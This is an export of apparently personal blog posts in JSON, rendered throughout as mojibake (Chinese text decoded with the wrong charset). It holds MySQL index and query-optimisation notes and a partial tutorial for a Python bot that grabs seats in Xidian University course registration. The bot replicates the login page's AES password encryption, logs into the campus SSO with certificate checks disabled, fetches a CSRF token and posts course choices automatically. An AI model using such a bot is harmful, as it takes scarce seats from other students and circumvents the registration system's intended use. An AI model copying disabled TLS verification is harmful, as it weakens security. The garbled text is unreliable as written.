ä¸Šæ–‡æˆ‘ä»¬å·²ç»è¯´æ˜å•ä¸ªå¶å­èŠ‚ç‚¹ï¼ˆé¡µï¼‰ä¸­çš„è®°å½•æ•°=16K/1K=16ã€‚ï¼ˆè¿™é‡Œå‡è®¾ä¸€è¡Œè®°å½•çš„æ•°æ®å¤§å°ä¸º1kï¼Œå®é™…ä¸Šç°åœ¨å¾ˆå¤šäº’è”ç½‘ä¸šåŠ¡æ•°æ®è®°å½•å¤§å°é€šå¸¸å°±æ˜¯1Kå·¦å³ï¼‰ã€‚ é‚£ä¹ˆç°åœ¨æˆ‘ä»¬éœ€è¦è®¡ç®—å‡ºéå¶å­èŠ‚ç‚¹èƒ½å­˜æ”¾å¤šå°‘æŒ‡é’ˆï¼Œå…¶å®è¿™ä¹Ÿå¾ˆå¥½ç®—ï¼Œæˆ‘ä»¬å‡è®¾ä¸»é”®IDä¸ºbigintç±»å‹ï¼Œé•¿åº¦ä¸º8å­—èŠ‚ï¼Œè€ŒæŒ‡é’ˆå¤§å°åœ¨InnoDBæºç ä¸­è®¾ç½®ä¸º6å­—èŠ‚ï¼Œè¿™æ ·ä¸€å…±14å­—èŠ‚ï¼Œæˆ‘ä»¬ä¸€ä¸ªé¡µä¸­èƒ½å­˜æ”¾å¤šå°‘è¿™æ ·çš„å•å…ƒï¼Œå…¶å®å°±ä»£è¡¨æœ‰å¤šå°‘æŒ‡é’ˆï¼Œå³16384/14=1170ã€‚é‚£ä¹ˆå¯ä»¥ç®—å‡ºä¸€æ£µé«˜åº¦ä¸º2çš„B+æ ‘ï¼Œèƒ½å­˜æ”¾1170*16=18720æ¡è¿™æ ·çš„æ•°æ®è®°å½•ã€‚ ç´¢å¼•è¯­æ³•1) åˆ›å»ºç´¢å¼• CREATE [ UNIQUE | FULLTEXT ] INDEX index_name ON table_name ( index_col_name,... ); 2) æŸ¥çœ‹ç´¢å¼• show INDEX in account; 3) åˆ é™¤ç´¢å¼• DROP INDEX index_name ON table_name ; ç´¢å¼•çš„ä½¿ç”¨ nameå­—æ®µä¸ºå§“åå­—æ®µï¼Œè¯¥å­—æ®µçš„å€¼å¯èƒ½ä¼šé‡å¤ï¼Œä¸ºè¯¥å­—æ®µåˆ›å»ºç´¢å¼• CREATE INDEX idx_user_name ON tb_user(name); phoneæ‰‹æœºå·å­—æ®µçš„å€¼ï¼Œæ˜¯éç©ºï¼Œä¸”å”¯ä¸€çš„ï¼Œä¸ºè¯¥å­—æ®µåˆ›å»ºå”¯ä¸€ç´¢å¼•ã€‚ CREATE UNIQUE INDEX idx_user_phone ON tb_user(phone); ä¸ºprofessionã€ageã€statusåˆ›å»ºè”åˆç´¢å¼•ã€‚ CREATE INDEX idx_user_profession_age_status ON tb_user(profession, age, status); ä¸ºemailå»ºç«‹åˆé€‚çš„ç´¢å¼•æ¥æå‡æŸ¥è¯¢æ•ˆç‡ CREATE INDEX idx_user_email ON tb_user(email); æŸ¥çœ‹è¡¨ä¸­å·²åˆ›å»ºçš„ç´¢å¼• SQLæ€§èƒ½åˆ†æSQLçš„æ‰§è¡Œé¢‘æ¬¡SHOW GLOBAL STATUS LIKE &#39;Com_____&#39;; SHOW SESSION STATUS LIKE &#39;Com_____&#39;; æ…¢æŸ¥è¯¢æ—¥å¿—æ…¢æŸ¥è¯¢æ—¥å¿—è®°å½•äº†æ‰€æœ‰æ‰§è¡Œæ—¶é—´è¶…è¿‡æŒ‡å®šå‚æ•°ï¼ˆlong_query_timeï¼Œå•ä½ï¼šç§’ï¼Œé»˜è®¤10ç§’ï¼‰çš„æ‰€æœ‰SQLè¯­å¥çš„æ—¥å¿—ã€‚ MySQLçš„æ…¢æŸ¥è¯¢æ—¥å¿—é»˜è®¤æ²¡æœ‰å¼€å¯ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿå˜é‡ slow_query_logã€‚ å¼€å¯slow_query_log(é»˜è®¤å…³é—­)ï¼Œåœ¨mysqlé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹é…ç½® slow_query_log = 1 long_query_time= 2 # å½“æŸ¥è¯¢æ—¶é—´è¶…è¿‡ä¸¤ç§’æ—¶ï¼Œä¼šè¢«è®°å½• profileè¯¦æƒ…show profiles èƒ½å¤Ÿåœ¨åšSQLä¼˜åŒ–æ—¶å¸®åŠ©æˆ‘ä»¬äº†è§£æ—¶é—´éƒ½è€—è´¹åˆ°å“ªé‡Œå»äº†ã€‚é€šè¿‡have_profilingå‚æ•°ï¼Œèƒ½å¤Ÿçœ‹åˆ°å½“å‰MySQLæ˜¯å¦æ”¯æŒprofileæ“ä½œï¼š SHOW @@hava_profiling; å¦‚æœæ²¡æœ‰å¼€å¯ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­å¥å¼€å¯ set profiling &#x3D; 1 æ‰§è¡Œä¸€ç³»åˆ—çš„ä¸šåŠ¡SQLçš„æ“ä½œï¼Œç„¶åé€šè¿‡å¦‚ä¸‹æŒ‡ä»¤æŸ¥çœ‹æŒ‡ä»¤çš„æ‰§è¡Œè€—æ—¶ï¼š -- æŸ¥çœ‹æ¯ä¸€æ¡SQLçš„è€—æ—¶åŸºæœ¬æƒ…å†µ show profiles; -- æŸ¥çœ‹æŒ‡å®šquery_idçš„SQLè¯­å¥å„ä¸ªé˜¶æ®µçš„è€—æ—¶æƒ…å†µ show profile for query query_id; -- æŸ¥çœ‹æŒ‡å®šquery_idçš„SQLè¯­å¥CPUçš„ä½¿ç”¨æƒ…å†µ show profile cpu for query query_id; æœ€å·¦å‰ç¼€æ³•åˆ™å¦‚æœç´¢å¼•äº†å¤šåˆ—ï¼ˆè”åˆç´¢å¼•ï¼‰ï¼Œè¦éµå®ˆæœ€å·¦å‰ç¼€æ³•åˆ™ã€‚æœ€å·¦å‰ç¼€æ³•åˆ™æŒ‡çš„æ˜¯æŸ¥è¯¢ä»ç´¢å¼•çš„æœ€å·¦åˆ—å¼€å§‹ï¼Œå¹¶ä¸”ä¸è·³è¿‡ç´¢å¼•ä¸­çš„åˆ—ã€‚å¦‚æœè·³è·ƒæŸä¸€åˆ—ï¼Œç´¢å¼•å°†ä¼šéƒ¨åˆ†å¤±æ•ˆ(åé¢çš„å­—æ®µç´¢å¼•å¤±æ•ˆ)ã€‚ è¦†ç›–ç´¢å¼•å°½é‡ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œå‡å°‘select *ã€‚ é‚£ä¹ˆä»€ä¹ˆæ˜¯è¦†ç›–ç´¢å¼•å‘¢ï¼Ÿ è¦†ç›–ç´¢å¼•æ˜¯æŒ‡ æŸ¥è¯¢ä½¿ç”¨äº†ç´¢å¼•ï¼Œå¹¶ä¸”éœ€è¦è¿”å›çš„åˆ—ï¼Œåœ¨è¯¥ç´¢å¼•ä¸­å·²ç»å…¨éƒ¨èƒ½å¤Ÿæ‰¾åˆ° ã€‚ ä½¿ç”¨è¦†ç›–ç´¢å¼•å¯ä»¥é¿å…å›è¡¨æŸ¥è¯¢ï¼Œæé«˜sqlæŸ¥è¯¢çš„æ•ˆç‡ã€‚ ç´¢å¼•è®¾è®¡åŸåˆ™ 1). é’ˆå¯¹äºæ•°æ®é‡è¾ƒå¤§ï¼Œä¸”æŸ¥è¯¢æ¯”è¾ƒé¢‘ç¹çš„è¡¨å»ºç«‹ç´¢å¼•ã€‚ 2). é’ˆå¯¹äºå¸¸ä½œä¸ºæŸ¥è¯¢æ¡ä»¶ï¼ˆwhereï¼‰ã€æ’åºï¼ˆorder byï¼‰ã€åˆ†ç»„ï¼ˆgroup byï¼‰æ“ä½œçš„å­—æ®µå»ºç«‹ç´¢å¼•ã€‚ 3). å°½é‡é€‰æ‹©åŒºåˆ†åº¦é«˜çš„åˆ—ä½œä¸ºç´¢å¼•ï¼Œå°½é‡å»ºç«‹å”¯ä¸€ç´¢å¼•ï¼ŒåŒºåˆ†åº¦è¶Šé«˜ï¼Œä½¿ç”¨ç´¢å¼•çš„æ•ˆç‡è¶Šé«˜ã€‚ 4). å¦‚æœæ˜¯å­—ç¬¦ä¸²ç±»å‹çš„å­—æ®µï¼Œå­—æ®µçš„é•¿åº¦è¾ƒé•¿ï¼Œå¯ä»¥é’ˆå¯¹äºå­—æ®µçš„ç‰¹ç‚¹ï¼Œå»ºç«‹å‰ç¼€ç´¢å¼•ã€‚ 5). å°½é‡ä½¿ç”¨è”åˆç´¢å¼•ï¼Œå‡å°‘å•åˆ—ç´¢å¼•ï¼ŒæŸ¥è¯¢æ—¶ï¼Œè”åˆç´¢å¼•å¾ˆå¤šæ—¶å€™å¯ä»¥è¦†ç›–ç´¢å¼•ï¼ŒèŠ‚çœå­˜å‚¨ç©ºé—´ï¼Œé¿å…å›è¡¨ï¼Œæé«˜æŸ¥è¯¢æ•ˆç‡ã€‚ 6). è¦æ§åˆ¶ç´¢å¼•çš„æ•°é‡ï¼Œç´¢å¼•å¹¶ä¸æ˜¯å¤šå¤šç›Šå–„ï¼Œç´¢å¼•è¶Šå¤šï¼Œç»´æŠ¤ç´¢å¼•ç»“æ„çš„ä»£ä»·ä¹Ÿå°±è¶Šå¤§ï¼Œä¼šå½±å“å¢åˆ æ”¹çš„æ•ˆç‡ã€‚ create unique index idx_user_phone_name on tb_user(phone,name); 7). å¦‚æœç´¢å¼•åˆ—ä¸èƒ½å­˜å‚¨NULLå€¼ï¼Œè¯·åœ¨åˆ›å»ºè¡¨æ—¶ä½¿ç”¨NOT NULLçº¦æŸå®ƒã€‚å½“ä¼˜åŒ–å™¨çŸ¥é“æ¯åˆ—æ˜¯å¦åŒ…å«NULLå€¼æ—¶ï¼Œå®ƒå¯ä»¥æ›´å¥½åœ°ç¡®å®šå“ªä¸ªç´¢å¼•æœ€æœ‰æ•ˆåœ°ç”¨äºæŸ¥è¯¢ã€‚ SQLä¼˜åŒ–æ’å…¥æ•°æ®å¦‚æœæˆ‘ä»¬éœ€è¦ä¸€æ¬¡æ€§å¾€æ•°æ®åº“è¡¨ä¸­æ’å…¥å¤šæ¡è®°å½•ï¼Œå¯ä»¥ä»ä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢è¿›è¡Œä¼˜åŒ–ã€‚ 1). ä¼˜åŒ–æ–¹æ¡ˆä¸€ æ‰¹é‡æ’å…¥æ•°æ® 2). ä¼˜åŒ–æ–¹æ¡ˆäºŒ æ‰‹åŠ¨æ§åˆ¶äº‹åŠ¡ 3). ä¼˜åŒ–æ–¹æ¡ˆä¸‰ ä¸»é”®é¡ºåºæ’å…¥ï¼Œæ€§èƒ½è¦é«˜äºä¹±åºæ’å…¥ å¦‚æœä¸€æ¬¡æ€§éœ€è¦æ’å…¥å¤§æ‰¹é‡æ•°æ®(æ¯”å¦‚: å‡ ç™¾ä¸‡çš„è®°å½•)ï¼Œä½¿ç”¨insertè¯­å¥æ’å…¥æ€§èƒ½è¾ƒä½ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ ç”¨MySQLæ•°æ®åº“æä¾›çš„loadæŒ‡ä»¤è¿›è¡Œæ’å…¥ã€‚ -- å®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯æ—¶ï¼ŒåŠ ä¸Šå‚æ•° -â€“local-infile mysql â€“-local-infile -u root -p -- è®¾ç½®å…¨å±€å‚æ•°local_infileä¸º1ï¼Œå¼€å¯ä»æœ¬åœ°åŠ è½½æ–‡ä»¶å¯¼å…¥æ•°æ®çš„å¼€å…³ set global local_infile &#x3D; 1; -- æ‰§è¡ŒloadæŒ‡ä»¤å°†å‡†å¤‡å¥½çš„æ•°æ®ï¼ŒåŠ è½½åˆ°è¡¨ç»“æ„ä¸­ load data local infile &#39;&#x2F;root&#x2F;sql1.log&#39; into table tb_user fields terminated by &#39;,&#39; lines terminated by &#39;\\n&#39; ; 4).ä¸»é”®é¡ºåºæ’å…¥ï¼Œæ€§èƒ½è¦é«˜äºä¹±åºæ’å…¥ ä¸»é”®ä¼˜åŒ– æ»¡è¶³ä¸šåŠ¡éœ€æ±‚çš„æƒ…å†µä¸‹ï¼Œå°½é‡é™ä½ä¸»é”®çš„é•¿åº¦ã€‚ æ’å…¥æ•°æ®æ—¶ï¼Œå°½é‡é€‰æ‹©é¡ºåºæ’å…¥ï¼Œé€‰æ‹©ä½¿ç”¨AUTO_INCREMENTè‡ªå¢ä¸»é”®ã€‚ å°½é‡ä¸è¦ä½¿ç”¨UUIDåšä¸»é”®æˆ–è€…æ˜¯å…¶ä»–è‡ªç„¶ä¸»é”®ï¼Œå¦‚èº«ä»½è¯å·ã€‚ ä¸šåŠ¡æ“ä½œæ—¶ï¼Œé¿å…å¯¹ä¸»é”®çš„ä¿®æ”¹ã€‚ order byä¼˜åŒ–MySQLçš„æ’åºï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š Using filesort : é€šè¿‡è¡¨çš„ç´¢å¼•æˆ–å…¨è¡¨æ‰«æï¼Œè¯»å–æ»¡è¶³æ¡ä»¶çš„æ•°æ®è¡Œï¼Œç„¶ååœ¨æ’åºç¼“å†²åŒºsortbufferä¸­å®Œæˆæ’åºæ“ä½œï¼Œæ‰€æœ‰ä¸æ˜¯é€šè¿‡ç´¢å¼•ç›´æ¥è¿”å›æ’åºç»“æœçš„æ’åºéƒ½å« FileSort æ’åºã€‚ Using index : é€šè¿‡æœ‰åºç´¢å¼•é¡ºåºæ‰«æç›´æ¥è¿”å›æœ‰åºæ•°æ®ï¼Œè¿™ç§æƒ…å†µå³ä¸º using indexï¼Œä¸éœ€è¦é¢å¤–æ’åºï¼Œæ“ä½œæ•ˆç‡é«˜ã€‚ å¯¹äºä»¥ä¸Šçš„ä¸¤ç§æ’åºæ–¹å¼ï¼ŒUsing indexçš„æ€§èƒ½é«˜ï¼Œè€ŒUsing filesortçš„æ€§èƒ½ä½ï¼Œæˆ‘ä»¬åœ¨ä¼˜åŒ–æ’åºæ“ä½œæ—¶ï¼Œå°½é‡è¦ä¼˜åŒ–ä¸º Using indexã€‚ order byä¼˜åŒ–åŸåˆ™: A. æ ¹æ®æ’åºå­—æ®µå»ºç«‹åˆé€‚çš„ç´¢å¼•ï¼Œå¤šå­—æ®µæ’åºæ—¶ï¼Œä¹Ÿéµå¾ªæœ€å·¦å‰ç¼€æ³•åˆ™ã€‚ B. å°½é‡ä½¿ç”¨è¦†ç›–ç´¢å¼•ã€‚ C. å¤šå­—æ®µæ’åº, ä¸€ä¸ªå‡åºä¸€ä¸ªé™åºï¼Œæ­¤æ—¶éœ€è¦æ³¨æ„è”åˆç´¢å¼•åœ¨åˆ›å»ºæ—¶çš„è§„åˆ™ï¼ˆASC/DESCï¼‰ã€‚ D. å¦‚æœä¸å¯é¿å…çš„å‡ºç°filesortï¼Œå¤§æ•°æ®é‡æ’åºæ—¶ï¼Œå¯ä»¥é€‚å½“å¢å¤§æ’åºç¼“å†²åŒºå¤§å° sort_buffer_size(é»˜è®¤256k)ã€‚ group byä¼˜åŒ–åœ¨åˆ†ç»„æ“ä½œä¸­ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ä»¥ä¸‹ä¸¤ç‚¹è¿›è¡Œä¼˜åŒ–ï¼Œä»¥æå‡æ€§èƒ½ï¼š A. åœ¨åˆ†ç»„æ“ä½œæ—¶ï¼Œå¯ä»¥é€šè¿‡ç´¢å¼•æ¥æé«˜æ•ˆç‡ã€‚ B. åˆ†ç»„æ“ä½œæ—¶ï¼Œç´¢å¼•çš„ä½¿ç”¨ä¹Ÿæ˜¯æ»¡è¶³æœ€å·¦å‰ç¼€æ³•åˆ™çš„ã€‚ limitä¼˜åŒ–ä¼˜åŒ–æ€è·¯: ä¸€èˆ¬åˆ†é¡µæŸ¥è¯¢æ—¶ï¼Œé€šè¿‡åˆ›å»º è¦†ç›–ç´¢å¼• èƒ½å¤Ÿæ¯”è¾ƒå¥½åœ°æé«˜æ€§èƒ½ï¼Œå¯ä»¥é€šè¿‡è¦†ç›–ç´¢å¼•åŠ å­æŸ¥è¯¢å½¢å¼è¿›è¡Œä¼˜åŒ–ã€‚ countä¼˜åŒ–countçš„å·¥ä½œåŸç† MyISAM å¼•æ“æŠŠä¸€ä¸ªè¡¨çš„æ€»è¡Œæ•°å­˜åœ¨äº†ç£ç›˜ä¸Šï¼Œå› æ­¤æ‰§è¡Œ count(*) çš„æ—¶å€™ä¼šç›´æ¥è¿”å›è¿™ä¸ªæ•°ï¼Œæ•ˆç‡å¾ˆé«˜ï¼› ä½†æ˜¯å¦‚æœæ˜¯å¸¦æ¡ä»¶çš„countï¼ŒMyISAMä¹Ÿæ…¢ã€‚ InnoDB å¼•æ“å°±éº»çƒ¦äº†ï¼Œå®ƒæ‰§è¡Œ count(*) çš„æ—¶å€™ï¼Œéœ€è¦æŠŠæ•°æ®ä¸€è¡Œä¸€è¡Œåœ°ä»å¼•æ“é‡Œé¢è¯»å‡ºæ¥ï¼Œç„¶åç´¯ç§¯è®¡æ•°ã€‚ countçš„ç”¨æ³• count() æ˜¯ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œå¯¹äºè¿”å›çš„ç»“æœé›†ï¼Œä¸€è¡Œè¡Œåœ°åˆ¤æ–­ï¼Œå¦‚æœ count å‡½æ•°çš„å‚æ•°ä¸æ˜¯NULLï¼Œç´¯è®¡å€¼å°±åŠ  1ï¼Œå¦åˆ™ä¸åŠ ï¼Œæœ€åè¿”å›ç´¯è®¡å€¼ã€‚ ç”¨æ³•ï¼šcountï¼ˆ*ï¼‰ã€countï¼ˆä¸»é”®ï¼‰ã€countï¼ˆå­—æ®µï¼‰ã€countï¼ˆæ•°å­—ï¼‰ countç”¨æ³• å«ä¹‰ count(ä¸»é”®) InnoDB å¼•æ“ä¼šéå†æ•´å¼ è¡¨ï¼ŒæŠŠæ¯ä¸€è¡Œçš„ ä¸»é”®id å€¼éƒ½å–å‡ºæ¥ï¼Œè¿”å›ç»™æœåŠ¡å±‚ã€‚æœåŠ¡å±‚æ‹¿åˆ°ä¸»é”®åï¼Œç›´æ¥æŒ‰è¡Œè¿›è¡Œç´¯åŠ (ä¸»é”®ä¸å¯èƒ½ä¸ºnull)ã€‚ count(*) æ²¡æœ‰not null çº¦æŸ: InnoDB å¼•æ“ä¼šéå†æ•´å¼ è¡¨æŠŠæ¯ä¸€è¡Œçš„å­—æ®µå€¼éƒ½å–å‡ºæ¥ï¼Œè¿”å›ç»™æœåŠ¡å±‚ï¼ŒæœåŠ¡å±‚åˆ¤æ–­æ˜¯å¦ä¸ºnullï¼Œä¸ä¸ºnullï¼Œè®¡æ•°ç´¯åŠ ã€‚æœ‰not null çº¦æŸ: InnoDBå¼•æ“ä¼šéå†æ•´å¼ è¡¨æŠŠæ¯ä¸€è¡Œçš„å­—æ®µå€¼éƒ½å–å‡ºæ¥ï¼Œè¿”å›ç»™æœåŠ¡å±‚ï¼Œç›´æ¥æŒ‰è¡Œè¿›è¡Œç´¯åŠ ã€‚ count(å­—æ®µ) InnoDB å¼•æ“éå†æ•´å¼ è¡¨ï¼Œä½†ä¸å–å€¼ã€‚æœåŠ¡å±‚å¯¹äºè¿”å›çš„æ¯ä¸€è¡Œï¼Œæ”¾ä¸€ä¸ªæ•°å­—â€™1â€™è¿›å»ï¼Œç›´æ¥æŒ‰è¡Œè¿›è¡Œç´¯åŠ ã€‚ count(æ•°å­—) InnoDBå¼•æ“å¹¶ä¸ä¼šæŠŠå…¨éƒ¨å­—æ®µå–å‡ºæ¥ï¼Œè€Œæ˜¯ä¸“é—¨åšäº†ä¼˜åŒ–ï¼Œä¸å–å€¼ï¼ŒæœåŠ¡å±‚ç›´æ¥æŒ‰è¡Œç´¯åŠ ã€‚ æŒ‰ç…§æ•ˆç‡æ’åºçš„è¯ï¼Œcount(å­—æ®µ) &lt; count(ä¸»é”® id) &lt; count(1) â‰ˆ count()ï¼Œæ‰€ä»¥å°½é‡ä½¿ç”¨ count(\\)ã€‚","tags":[{"name":"mysql","slug":"mysql","permalink":"https://sunzhengyu99.github.io/tags/mysql/"}]},{"title":"XDU_choose_course","date":"2022-09-09T04:59:12.000Z","path":"2022/09/09/XDU-choose-course/","text":"XDU æŠ¢è¯¾è„šæœ¬é¡¹ç›®åœ°å€ 1.ç™»å½•è®¤è¯1.1 å¯†ç åŠ å¯†é¦–å…ˆåœ¨æµè§ˆå™¨ä¸­åœ¨åŒä¸€èº«ä»½çš„ä½ç½®è¿›è¡Œæ‰‹åŠ¨ç™»å½•å¯ä»¥å‘ç°å¦‚ä¸‹çš„è¯·æ±‚ è¾“å…¥çš„å¯†ç å·²ç»è¢«åŠ å¯† è¡¨å•å‚æ•°ä¸­å¤šäº†ä¸€ä¸ªexecutionå‚æ•° åœ¨æµè§ˆå™¨æ‹¦æˆªçš„è¯·æ±‚ä¸­æœ‰ä¸€ä¸ªencrypt.jsçš„æ–‡ä»¶ï¼ŒçŒœæµ‹æ˜¯ç”¨äºåŠ å¯†å¯†ç çš„ è¯¥æ–‡ä»¶çš„ä»£ç å¾ˆé•¿ï¼Œä½†æ˜¯æ ¸å¿ƒçš„åŠ å¯†è¿‡ç¨‹å¦‚ä¸‹ function getAesString(data, key0, iv0) &#123; key0 = key0.replace(/(^\\s+)|(\\s+$)/g, &quot;&quot;); var key = CryptoJS.enc.Utf8.parse(key0); var iv = CryptoJS.enc.Utf8.parse(iv0); var encrypted = CryptoJS.AES.encrypt(data, key, &#123; iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 &#125;); return encrypted.toString(); &#125; function encryptAES(data, aesKey) &#123; if (!aesKey) &#123; return data; &#125; var encrypted = getAesString( randomString(64) + data, aesKey, randomString(16) ); return encrypted; &#125; function encryptPassword(pwd0, key) &#123; try &#123; return encryptAES(pwd0, key); &#125; catch (e) &#123;&#125; return pwd0; &#125; var $aes_chars = &quot;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&quot;; var aes_chars_len = $aes_chars.length; function randomString(len) &#123; var retStr = &quot;&quot;; for (i = 0; i &lt; len; i++) &#123; retStr += $aes_chars.charAt(Math.floor(Math.random() * aes_chars_len)); &#125; return retStr; &#125; å¯ä»¥çœ‹å‡ºä½¿ç”¨çš„æ—¶AESçš„CBCæ¨¡å¼è¿›è¡ŒåŠ å¯†ï¼Œè€ŒAESåœ¨åŠ å¯†æ—¶éœ€è¦ä¸€ä¸ªå¯†é’¥ï¼Œè¿™ä¸ªå¯†é’¥åº”è¯¥æ˜¯éšè—åœ¨å‰ç«¯é¡µé¢ä¸­ï¼Œæ¯æ¬¡åˆ·æ–°éƒ½ä¼šæ›´æ–°ã€‚ æœç„¶åœ¨å‰ç«¯é¡µé¢ä¸­å¯ä»¥æ‰¾åˆ°pwdEncryptSaltå­—æ®µï¼Œå¹¶æŠŠexecutionå­—æ®µä¹Ÿæ‰¾äº†å‡ºæ¥ ä¸‹é¢å°±æ˜¯å†™å‡ºAESåŠ å¯†çš„è„šæœ¬(fe1w0å†™çš„) def encryptPassword(password, key): # password åŠ å¯†, è¯¥æ®µä»£ç å‚è€ƒäº https://github.com/EdenLin-c/CPdaily/blob/master/Jin.py def randomString(len): retStr = &#x27;&#x27; i=0 while i &lt; len: retStr += aes_chars[(math.floor(random.random() * aes_chars_len))] i=i+1 return retStr def getAesString(data,key,iv): key = re.sub(&#x27;/(^\\s+)|(\\s+$)/g&#x27;, &#x27;&#x27;, key) aes = AES.new(str.encode(key),AES.MODE_CBC,str.encode(iv)) pad_pkcs7 = pad(data.encode(&#x27;utf-8&#x27;), AES.block_size, style=&#x27;pkcs7&#x27;) encrypted =aes.encrypt(pad_pkcs7) return str(base64.b64encode(encrypted),&#x27;utf-8&#x27;) aes_chars = &#x27;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&#x27; aes_chars_len = len(aes_chars) encrypted = getAesString(randomString(64) + password, key, randomString(16)) return encrypted 1.2 è·å–sessionä¸‹é¢å°±æ˜¯ä½¿ç”¨requeseè·å–ç™»å½•çš„session è®¾ç½®è¯·æ±‚å¤´ headers = &#123; &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;, &#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;, &#x27;Content-Length&#x27;: &#x27;154&#x27;, &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#x27;Host&#x27;: &#x27;ids.xidian.edu.cn&#x27;, &#x27;Origin&#x27;: &#x27;http://ids.xidian.edu.cn&#x27;, &#x27;Referer&#x27;: &#x27;http://ids.xidian.edu.cn/authserver/login&#x27;, &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;, &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36&#x27;, &#125; è·å–å‰ç«¯é¡µé¢çš„pwdEncryptSaltå­—æ®µå’Œexecutionå­—æ®µï¼Œå¹¶å¯¹å¯†ç è¿›è¡ŒåŠ å¯† session_client = requests.Session() requests.packages.urllib3.disable_warnings() response = session_client.get(&quot;https://ids.xidian.edu.cn/authserver/login&quot;) parse_html = etree.HTML(response.text) pwdEncryptSalt = parse_html.xpath(&#x27;//div//input[@id=&quot;pwdEncryptSalt&quot;]//@value&#x27;)[0] execution = parse_html.xpath(&#x27;//div//input[@id=&quot;execution&quot;]//@value&#x27;)[0] encrypt_passwrod = encryptPassword(password, pwdEncryptSalt) è®¾ç½®postè¯·æ±‚å‚æ•° post_data = &#123; &quot;username&quot;: user_id, &quot;password&quot;: encrypt_passwrod, &quot;captcha&quot;: None, &quot;_eventId&quot;: &quot;submit&quot;, &quot;cllt&quot;: &quot;userNameLogin&quot;, &quot;dllt&quot;: &quot;generalLogin&quot;, &quot;lt&quot;: None, &quot;execution&quot;: execution &#125; sso_response = session_client.post(&quot;https://ids.xidian.edu.cn/authserver/login&quot;, headers=headers, data=post_data,verify=False) 2.è·å–è¯¾ç¨‹åˆ—è¡¨è¿›å…¥é€‰è¯¾å¹³å°åï¼Œèƒ½å¤Ÿçœ‹åˆ°https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/loadJhnCourseInfo.doè¿™æ ·ä¸€æ¡è¯·æ±‚ï¼ŒæŸ¥çœ‹æ•°å¯çŸ¥ï¼Œæ˜¯åŠ è½½è®¡åˆ’å†…é€‰è¯¾çš„api å†ä»”ç»†çœ‹æ‹¦æˆªçš„è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šè¯·æ±‚å‚æ•° ç¬¬ä¸€ä¸ªå°±æ˜¯æŸ¥è¯¢å…³é”®å­—å‚æ•°ï¼Œå³å°†æƒ³æŠ¢è¯¾çš„è¯¾ç¨‹ä»£ç æˆ–è¯¾ç¨‹åæ”¾åˆ°æ­¤å¤„å³å¯è·å–åˆ°ç›¸åº”çš„è¯¾ç¨‹ä¿¡æ¯ã€‚ def getCourseInfo(session_client, course_KCDM): &quot;&quot;&quot; è·å–æŒ‡å®šè¯¾ç¨‹çš„è¯¦ç»†ä¿¡æ¯ :param session_client: :param course_KCDM: :return: &quot;&quot;&quot; # course_KCDM = &quot;&quot; course_infos = session_client.post(&quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/loadJhnCourseInfo.do?query_keyword=&quot; + course_KCDM, verify = False) course_json = json.loads(course_infos.text)[&quot;datas&quot;] if len(course_json) == 0: return None course_info = &quot;&quot; for course in course_json: if course_KCDM == course[&quot;KCDM&quot;]: course_info = course break return course_info 3.ç›‘æ§å®¹é‡å¹¶æŠ¢è¯¾3.1 é€‰è¯¾å‡½æ•°è·å–è¯¾ç¨‹ä¿¡æ¯åï¼Œåªè¦åˆ¤æ–­è¯¾ç¨‹çš„å®¹é‡ä¸å½“å‰çš„é€‰è¯¾äººæ•°çš„å…³ç³»å³å¯è¿›è¡Œé€‰è¯¾ã€‚ç‚¹å‡»é€‰è¯¾æŒ‰é’®ï¼Œå‘é€çš„è¯·æ±‚å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åŠ å…¥csrfTokenï¼Œé‚£ä¹ˆå°±æƒ³åŠæ³•æ‰¾åˆ°å®ƒå°±èƒ½è¿›è¡Œé€‰è¯¾äº†ã€‚ åœ¨åˆ·æ–°é€‰è¯¾é¡µé¢æ—¶ï¼Œä¼šå‡ºç°https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkHome/loadPublicInfo_course.doï¼Œå…¶è¿”å›çš„æ•°æ®ä¸­å°±åŒ…å«äº†csrfToken def chooseCourse(course_BJDM): &quot;&quot;&quot; é€‰è¯¾å‡½æ•°ï¼Œæ ¹æ®course_BJDMè¿›è¡Œé€‰è¯¾ :param course_BJDM: :return: &quot;&quot;&quot; csrf_token_url = &quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkHome/loadPublicInfo_course.do&quot; csrf_response = session_client.get(csrf_token_url).text json_csrf_res = json.loads(csrf_response) csrf_token = json_csrf_res.get(&quot;csrfToken&quot;) choose_course_url = &quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/choiceCourse.do?bjdm=&#123;0&#125;&amp;csrfToken=&#123;1&#125;&amp;lx=0&quot;.format(course_BJDM, csrf_token) 